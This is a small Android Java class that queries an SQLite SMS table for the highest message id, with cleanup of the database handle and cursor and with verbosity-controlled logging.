package com.vvt.sms;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.vvt.logger.FxLog;
import com.vvt.processsms.Customization;

public class SmsDatabaseManager {
	
	private static final String TAG = "SmsDatabaseManager";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	public static long getLatestSmsId() {
		if(LOGV) FxLog.v(TAG, "getLatestSmsId # ENTER ...");
		
		SQLiteDatabase db = SmsDatabaseHelper.getReadableDatabase();
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(LOGV) FxLog.v(TAG, "getLatestSmsId # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			return -1;
		}
		
		Cursor cursor = null;
		long id = -1;
		try {
			String sql = String.format("SELECT MAX(%s) FROM %s", 
					SmsDatabaseHelper.COLUMN_ID, SmsDatabaseHelper.TABLE_SMS);
			
			cursor = db.rawQuery(sql, null);
			
			if (cursor == null || cursor.getCount() == 0) {
				if(LOGW) FxLog.w(TAG, "getLatestSmsId # Query database FAILED!! -> EXIT ...");
				if (cursor != null) {
					cursor.close();
				}
				db.close();
				return -1;
			}
			
			id = -1;
			if (cursor.moveToNext()) {
				id = cursor.getLong(0);
			}
		} catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, String.format("getLatestSmsId # error: %s", e.toString()));
		} finally {
			if (cursor != null)
				cursor.close();
			if(db != null)
				db.close();
		}
		
		FxLog.v(TAG, String.format("getLatestSmsId # id: %d", id));
		FxLog.v(TAG, "getLatestSmsId # EXIT ...");
		return id;
	}
	
}
